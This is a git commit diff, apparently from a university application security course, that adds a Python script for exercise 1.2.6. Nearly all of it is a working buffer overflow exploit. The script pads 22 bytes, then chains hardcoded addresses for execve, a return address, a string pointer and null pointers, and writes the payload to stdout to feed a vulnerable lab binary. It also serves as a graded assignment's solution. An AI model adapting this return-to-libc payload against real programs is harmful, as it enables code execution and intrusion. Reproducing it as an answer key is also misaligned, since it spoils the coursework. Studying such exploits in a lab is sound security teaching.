6276c48eb1eaf8a754d15f39a5ab102ff44f3b7d
Birkhoff <zhiqic2@illinois.edu>
2021-02-03 22:43:12 +0800

    Implement 1.2.6

--- AppSec/1.2.6.py
+++ AppSec/1.2.6.py
@@ -1,7 +1,20 @@
 #!/usr/bin/env python3
-
+# needs to be run with ./1.2.6 "$(./1.2.6.py)" so 0x0a is not considered space
 import sys
 from shellcode import shellcode
 from struct import pack
 
 # Your code here
+orig_ret_addr = 0x0804891f
+execve_addr = 0x0806bce0
+null_addr = 0xfffed73c
+str_addr = 0x080ac9cc
+
+payload = b'A' * 22
+payload += pack('<I', execve_addr)
+payload += pack('<I', orig_ret_addr)
+payload += pack('<I', str_addr)
+payload += pack('<I', null_addr)
+payload += pack('<I', null_addr)
+
+sys.stdout.buffer.write(payload)
